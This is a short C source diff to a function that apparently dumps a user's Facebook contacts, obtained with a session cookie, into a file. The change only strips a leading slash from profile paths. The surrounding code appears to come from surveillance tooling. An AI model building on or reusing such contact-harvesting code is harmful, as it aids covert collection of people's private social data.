@@ -466,7 +466,10 @@ DWORD HandleFBContacts(char *cookie)
 		profile_w = UTF8_2_UTF16(profile_path);
 		category_w = UTF8_2_UTF16(category);
 
-		DumpContact(hfile, CONTACT_SRC_FACEBOOK, name_w, NULL, NULL, category_w, NULL, NULL, NULL, NULL, NULL, profile_w, flags);
+		if (profile_w[0] == L'/') // Toglie lo / dalla facebook page
+			DumpContact(hfile, CONTACT_SRC_FACEBOOK, name_w, NULL, NULL, category_w, NULL, NULL, NULL, NULL, NULL, profile_w+1, flags);
+		else
+			DumpContact(hfile, CONTACT_SRC_FACEBOOK, name_w, NULL, NULL, category_w, NULL, NULL, NULL, NULL, NULL, profile_w, flags);
 		
 		SAFE_FREE(name_w);
 		SAFE_FREE(profile_w);
